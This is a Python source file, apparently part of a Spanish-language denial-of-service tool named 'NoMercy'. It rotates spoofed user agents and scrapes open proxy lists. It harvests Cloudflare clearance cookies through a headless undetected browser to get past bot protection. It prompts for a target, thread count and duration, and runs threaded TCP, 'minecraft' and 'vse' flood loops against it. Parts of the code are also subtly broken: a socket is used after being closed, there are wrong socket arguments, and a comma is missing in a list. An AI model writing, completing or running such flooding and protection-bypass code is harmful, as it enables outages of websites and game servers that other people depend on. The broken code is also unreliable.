from math import log2, trunc
import requests
import socket
import os
import random
import getpass
import datetime
import time
import sys
import ssl
import random
import threading
import getpass
import httpx
import undetected_chromedriver as webdriver
import logging
from psutil import cpu_percent, net_io_counters, virtual_memory
from icmplib import ping
from colorama import Fore
from os import system, name
from httpx import get
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
from colorama import Fore, init
from contextlib import suppress

logger = logging.getLogger("NoMercy")

init(convert=True)
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.RED+"[*]"+Fore.WHITE+"Bajo ataque =>" + str((until - datetime.datetime.now()).total_seconds()) + "   quedan segundos   ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.RED+"[*]"+Fore.LIGHTBLUE_EX+"   ~~~~~~~~~~~~  Ataque completado !   ~~~~~~~~~~    \n")
            stdout.write("")
            return

######################################### user-agent block ###############################################
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]


# common_ports = {
#     20: "FTP (Data Transfer)",
#     21: "FTP (Command Control)",
#     22: "SSH",
#     23: "Telnet",
#     25: "SMTP (Email Routing)",
#     53: "DNS (Domain Name System)",
#     67: "DHCP (Server)",
#     68: "DHCP (Client)",
#     69: "TFTP (Trivial File Transfer Protocol)",
#     80: "HTTP (Hypertext Transfer Protocol)",
#     110: "POP3 (Post Office Protocol v3)",
#     123: "NTP (Network Time Protocol)",
#     137: "NetBIOS (Name Service)",
#     138: "NetBIOS (Datagram Service)",
#     139: "NetBIOS (Session Service)",
#     143: "IMAP (Internet Message Access Protocol)",
#     161: "SNMP (Simple Network Management Protocol)",
#     162: "SNMPTRAP (SNMP Trap)",
#     179: "BGP (Border Gateway Protocol)",
#     389: "LDAP (Lightweight Directory Access Protocol)",
#     443: "HTTPS (Hypertext Transfer Protocol Secure)",
#     445: "SMB (Server Message Block)",
#     465: "SMTPS (SMTP over SSL)",
#     514: "Syslog",
#     515: "LPD (Line Printer Daemon)",
#     587: "SMTP (Mail Submission)",
#     631: "IPP (Internet Printing Protocol)",
#     636: "LDAPS (LDAP over SSL)",
#     993: "IMAPS (IMAP over SSL)",
#     995: "POP3S (POP3 over SSL)",
#     1433: "MSSQL (Microsoft SQL Server)",
#     1434: "MSSQL Monitor",
#     1521: "Oracle Database",
#     1723: "PPTP (Point-to-Point Tunneling Protocol)",
#     2049: "NFS (Network File System)",
#     2082: "cPanel (Admin Interface)",
#     2083: "cPanel (Admin Interface, SSL)",
#     2181: "Apache Zookeeper",
#     3306: "MySQL",
#     3389: "RDP (Remote Desktop Protocol)",
#     3690: "Subversion (SVN)",
#     4444: "Metasploit",
#     5432: "PostgreSQL",
#     5900: "VNC (Virtual Network Computing)",
#     5984: "CouchDB",
#     6379: "Redis",
#     6667: "IRC (Internet Relay Chat)",
#     8000: "Common Alternative HTTP",
#     8080: "HTTP Proxy",
#     8443: "HTTPS (Alternative)",
#     8888: "Alternate HTTP",
#     9000: "SonarQube",
#     9092: "Kafka",
#     9200: "Elasticsearch",
#     11211: "Memcached",
#     27017: "MongoDB",
#     50000: "SAP",
#     50070: "Hadoop NameNode"
# }
common_ports = {
    20: "FTP (Data Transfer)",
    21: "FTP (Command Control)",
    22: "SSH",
    23: "Telnet",
    25: "SMTP (Email Routing)",
    53: "DNS (Domain Name System)",
    80: "HTTP (Hypertext Transfer Protocol)",
    110: "POP3 (Post Office Protocol v3)",
    143: "IMAP (Internet Message Access Protocol)",
    443: "HTTPS (Hypertext Transfer Protocol Secure)",
    445: "SMB (Server Message Block)",
    3389: "RDP (Remote Desktop Protocol)",
    8080: "HTTP Proxy",
}

################################## Methode #################################################
method = [
    "GET",
    "POST",
    "HEAD",
]

############################## Block Proxy ########################################
proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    'https://github.com/jetkai/proxy-list/blob/main/archive/txt/proxies.txt',
    'https://github.com/jetkai/proxy-list/blob/main/archive/txt/proxies-socks5.txt',
    'https://github.com/jetkai/proxy-list/blob/main/archive/txt/proxies-socks4.txt',
    'https://github.com/jetkai/proxy-list/blob/main/archive/txt/proxies-https.txt'
    'https://github.com/jetkai/proxy-list/blob/main/archive/txt/proxies-http.txt',
    'https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies-http.txt',
    'https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies-https.txt',
    'https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies-socks4.txt',
    'https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies-socks5.txt',
    'https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies.txt',
]

############################### Sock source #############################################
socksFile= "socks5.txt"

################################ get input data ########################################
def socksCrawler():
    global socksFile, socksResources
    f = open(socksFile,'wb')
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()

def get_target(url):
    # Ensure the URL has a scheme
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url  # Default to http:// if no scheme provided
    
    parsed_url = urlparse(url)
    target = {
        'uri': parsed_url.path if parsed_url.path else '/',
        'host': parsed_url.hostname,
        'scheme': parsed_url.scheme,
        'port': parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    }

    # Debugging output
    # print(f"Parsed URL: {parsed_url}")
    # print(f"Target host: {target['host']}, port: {target['port']}, scheme: {target['scheme']}, uri: {target['uri']}")

    return target

def get_proxies():
    global proxies
    if not os.path.exists("./http.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" Necesitas archivos proxy ( ./http.txt )\n")
        return False
    proxies = open("./http.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url  # or 'https://' depending on your need
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

############################################ GET USER INPUT ############################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    t = input()
    return target, thread, t

def get_info_l72():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"METHODE  "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    methode = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    t = input()
    return target, thread, methode, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTBLUE_EX+": "+Fore.LIGHTBLUE_EX)
    t = input()
    return target, port, thread, t

################################################# ENGINE ###########################################################

#tcp syn flood
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.setblocking(0)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                dport = random.randint(1, 65535) if port == 0 else port
                sock.connect((host, dport))
            except:
                pass

#minecraft dos
def runmine(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=mine, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def mine(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (host, int(port)))
        except:
            sock.close()
            pass

#vse dos
def runvse(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=vse, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def vse(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (host, int(port)))
        except:
            sock.close()
            pass


